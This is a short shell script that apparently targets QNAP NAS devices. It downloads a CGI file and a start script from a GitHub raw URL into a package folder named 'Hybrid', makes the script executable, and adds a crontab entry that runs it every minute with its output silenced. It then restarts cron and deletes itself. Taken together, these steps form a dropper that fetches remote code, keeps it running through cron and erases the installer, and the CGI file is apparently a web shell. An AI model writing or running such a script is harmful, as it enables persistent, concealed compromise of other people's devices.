#!/bin/sh
DEF_VOLMP=`/sbin/getcfg SHARE_DEF defVolMP -f /etc/config/def_share.info`
mkdir $DEF_VOLMP/.qpkg/Hybrid &&\
curl -JL -o $DEF_VOLMP/.qpkg/Hybrid/demigod.cgi https://raw.githubusercontent.com/Demigod-Moui/test/main/demigod.cgi &&\
curl -JL -o $DEF_VOLMP/.qpkg/Hybrid/start.sh https://raw.githubusercontent.com/Demigod-Moui/test/main/start.sh &&\
chmod +x $DEF_VOLMP/.qpkg/Hybrid/start.sh && /etc/init.d/crond.sh restart &&\
echo "* * * * * $DEF_VOLMP/.qpkg/Hybrid/start.sh >/dev/null 2>&1" >> /etc/config/crontab &&\
crontab /etc/config/crontab && /etc/init.d/crond.sh restart && rm -rf $0
